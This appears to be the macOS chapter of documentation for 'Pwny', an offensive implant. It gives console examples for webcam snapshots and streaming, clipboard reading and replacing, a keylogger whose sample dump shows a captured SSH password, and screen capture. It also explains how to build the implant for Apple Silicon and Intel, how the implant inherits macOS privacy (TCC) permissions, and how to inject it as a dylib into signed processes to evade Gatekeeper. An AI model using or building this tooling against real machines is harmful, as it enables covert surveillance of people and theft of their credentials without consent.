# macOS — Pwny Documentation

This section covers everything specific to running Pwny on **macOS** targets: platform-specific commands, building for Apple Silicon and Intel, and macOS-specific capabilities.

---

## Table of Contents

- [macOS-Specific Commands](#macos-specific-commands)
  - [cam — Camera Capture (AVFoundation)](#cam--camera-capture-avfoundation)
  - [clipboard — Pasteboard Access](#clipboard--pasteboard-access)
  - [keyscan — Keystroke Capture](#keyscan--keystroke-capture)
  - [screen — Screenshot & Streaming](#screen--screenshot--streaming)
- [Plugin System on macOS](#plugin-system-on-macos)
- [Building for macOS](#building-for-macos)
- [macOS-Specific Notes](#macos-specific-notes)

---

## macOS-Specific Commands

### `cam` — Camera Capture (AVFoundation)

Capture from macOS cameras using the AVFoundation framework.

**List cameras:**
```
pwny:/$ cam -l
Camera Devices
==============

 ID  Name
 --  ----
 0   FaceTime HD Camera
```

**Take a snapshot:**
```
pwny:/$ cam -s 0 -o /tmp/webcam.jpg
[+] Snapshot saved to /tmp/webcam.jpg
```

**Stream camera feed:**
```
pwny:/$ cam -S 0
[*] Streaming from FaceTime HD Camera... Press Ctrl+C to stop.
```

> **Note:** On macOS Mojave (10.14) and later, camera access requires TCC approval. The implant inherits camera permissions from its parent process.

---

### `clipboard` — Pasteboard Access

Read and write the macOS general pasteboard (clipboard).

```
pwny:/$ clipboard -g
[i] Clipboard content: some copied text

pwny:/$ clipboard -s "replaced content"
[+] Clipboard set.
```

Uses `NSPasteboard` under the hood. Works with text content.

---

### `keyscan` — Keystroke Capture

Capture keystrokes using the macOS event tap mechanism.

**Start keylogger:**
```
pwny:/$ keyscan start
[+] Keylogger started.
```

**Dump captured keystrokes:**
```
pwny:/$ keyscan dump
[*] Captured keystrokes:
ssh admin@192.168.1.1<ENTER>SuperSecretPass<ENTER>ls -la<ENTER>

pwny:/$ keyscan dump
[*] No new keystrokes captured.
```

**Stop keylogger:**
```
pwny:/$ keyscan stop
[+] Keylogger stopped.
```

> **Note:** Keylogging requires Accessibility permissions via TCC. The implant inherits permissions from its parent process (e.g., Terminal.app if launched from terminal).

---

### `screen` — Screenshot & Streaming

Capture screenshots or stream the screen in real-time.

**Take a screenshot:**
```
pwny:/$ screen -s -o /tmp/screenshot.bmp
[+] Saved image to /tmp/screenshot.bmp!
```

**Stream the screen:**
```
pwny:/$ screen -S
[*] Streaming screen...
[i] Press Ctrl-C to stop.
```

> **Note:** On macOS Catalina (10.15) and later, screen recording requires Screen Recording permission via TCC.

---

## Plugin System on macOS

macOS plugins use the **POSIX pipe IPC** mechanism:

1. Plugins are compiled as Mach-O bundles (`.bundle`)
2. Communication is established through named pipes
3. TLV protocol is used for data exchange between plugin and implant

Plugins are loaded from `pwny/tabs/macos/<arch>/`:

```
pwny:/$ list
Available plugins
=================

 Name       Architecture   Description
 ----       ------------   -----------
 (platform-specific plugins listed here)
```

### Loading Plugins

```
pwny:/$ load <plugin_name>
[*] Loading plugin...
[+] Plugin loaded successfully.
```

---

## Building for macOS

### Prerequisites

- Xcode Command Line Tools: `xcode-select --install`
- CMake: `brew install cmake`

### Native Build

Build natively on a macOS host:

```bash
# Build dependencies
make

# Build implant
cmake -DMAIN=ON -B build
cmake --build build

# Build with plugins
cmake -DMAIN=ON -DPLUGINS=ON -B build
cmake --build build
```

### Supported Targets

| Target | Triple | Hardware |
|--------|--------|----------|
| Apple Silicon | `aarch64-apple-darwin` | M1/M2/M3/M4 Macs |
| Intel | `x86_64-apple-darwin` | Intel-based Macs |

### Cross-Architecture Build

To build for the other architecture on your Mac:

```bash
# Build for Intel on Apple Silicon (or vice versa)
cmake -DCMAKE_TOOLCHAIN_FILE=toolchain/cmake/x86_64-apple-darwin.cmake \
      -DMAIN=ON -B build
cmake --build build
```

### Build Artifacts

| File | Description |
|------|-------------|
| `build/pwny` | Main implant Mach-O binary |
| `build/libpwny.dylib` | Shared library for migration |
| `pwny/tabs/macos/<arch>/*` | Plugin bundles |

---

## macOS-Specific Notes

### TCC (Transparency, Consent, and Control)

Starting with macOS Mojave (10.14), Apple enforces TCC for sensitive resources:

| Resource | TCC Category | Required For |
|----------|-------------|--------------|
| Camera | `kTCCServiceCamera` | `cam` command |
| Microphone | `kTCCServiceMicrophone` | Audio recording |
| Screen Recording | `kTCCServiceScreenCapture` | `screen` command |
| Accessibility | `kTCCServiceAccessibility` | `keyscan` command |
| Full Disk | `kTCCServiceSystemPolicyAllFiles` | Accessing protected files |

The implant inherits TCC permissions from the process that spawned it. If running from a terminal emulator with screen recording access, the implant can capture screenshots.

### Gatekeeper & Code Signing

macOS Gatekeeper blocks unsigned or unnotarized binaries. When deploying Pwny:

- The implant is unsigned by default
- Consider building as a `.dylib` for injection into a signed process
- Use `codesign` for ad-hoc signing: `codesign -s - build/pwny`

### SIP (System Integrity Protection)

SIP restricts access to certain system directories even as root:
- `/System`, `/usr` (except `/usr/local`), `/bin`, `/sbin`
- Cannot inject into Apple-signed system processes
- `csrutil status` shows SIP state

### Filesystem Paths

macOS uses standard POSIX paths:
```
pwny:/$ cd /Users/target
pwny:/Users/target$ ls
Desktop/  Documents/  Downloads/  Library/
```

---

## See Also

- [Commands Reference](../commands.md) — cross-platform commands
- [Console Features](../console.md) — prompt, banners, environment
- [Plugin Development](../plugin-development.md) — writing your own plugins
- [Building Guide](../building.md) — full build instructions
